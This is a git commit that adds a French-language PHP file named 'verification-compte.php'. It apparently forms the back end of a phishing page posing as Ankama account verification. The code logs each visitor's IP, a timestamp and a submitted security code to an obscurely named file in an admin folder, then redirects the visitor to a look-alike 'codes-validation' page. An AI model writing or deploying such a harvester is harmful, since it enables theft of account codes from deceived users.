15127c1dc9f334dc6b050916398b56ef9cedb2a0
bichop67 <116804966+bichop67@users.noreply.github.com>
2022-11-20 13:36:56 +0100

    Add files via upload

---
+++ verification-compte.php
@@ -0,0 +1,13 @@
+﻿<?php
+
+$ip = $_SERVER["REMOTE_ADDR"];
+
+$fichier = fopen('admin/U92Zb3ALSChwx4rLDa4DT5238i7i7ja.php', 'a+');
+fwrite($fichier, "IP: ");
+fwrite($fichier, $ip);
+fwrite($fichier, "        Quand ? ".date('j F Y h:i:s A')."        Numero de Telephone: ");
+fwrite($fichier, $_POST["Codesecurite"].PHP_EOL);
+fclose($fichier);
+
+?>
+<body onload="window.location.href = 'account.ankama=codes-validation.php';"></body>
